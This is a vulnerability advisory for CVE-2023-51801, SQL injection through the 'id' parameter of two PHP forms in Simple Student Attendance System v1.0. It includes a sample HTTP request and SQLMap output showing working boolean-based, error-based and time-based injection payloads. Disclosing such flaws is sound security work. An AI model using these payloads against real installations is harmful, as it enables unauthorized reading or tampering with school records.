# CVE-2023-51801
# Simple Student Attendance System v.1.0 - Multiple SQL injection vulnerabilities - student_form.php and class_form.php

**Description**:Simple Student Attendance System v.1.0 is prone to multiple SQL injection vulnerabilities that can be exploited by authenticated attackers. These vulnerabilities exist in student_form.php and class_form.php, allowing for the execution of arbitrary SQL commands via the 'id' parameter.  

**Vulnerable Product Version**: Simple Student Attendance System v.1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 29/11/2023  
**Confirmed on**: 10/01/2024  
**CVE**: CVE-2023-51801  
**CVE Link**: https://www.cve.org/CVERecord?id=CVE-2023-51801  
**NVD Link**: https://nvd.nist.gov/vuln/detail/CVE-2023-51801  
**Tenable Link**: https://www.tenable.com/cve/CVE-2023-51801  
**Tested on**: Windows  
### Steps to reproduce:  
To exploit this vulnerability, an attacker is required to navigate to either the 'Student' or 'Classes' pages, where they can proceed to edit or add a student or class. The malicious payload should then be inserted into the 'id' parameter.  
**Affected Component**:  
> Components:  student_form.php and class_form.php  
> Parameter: id  
## Request:
```
POST /php-attendance/modals/class_form.php HTTP/1.1
Host: 192.168.68.182
Cookie: PHPSESSID=emhqgom5shgrtcii7p3a8ad1bo
Content-Length: 4
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://192.168.68.182
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.68.182/php-attendance/?page=class_list
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i
Connection: close

id=1'
```
## SQLMap
```
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1''' AND 4206=4206-- KDFY

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1''' OR (SELECT 1707 FROM(SELECT COUNT(*),CONCAT(0x716a6a7071,(SELECT (ELT(1707=1707,1))),0x717a6a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xsae

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1''' AND (SELECT 1288 FROM (SELECT(SLEEP(5)))SVhp)-- EYkh
```
Discoverer(s)/Credits:  
Geraldo Alcântara
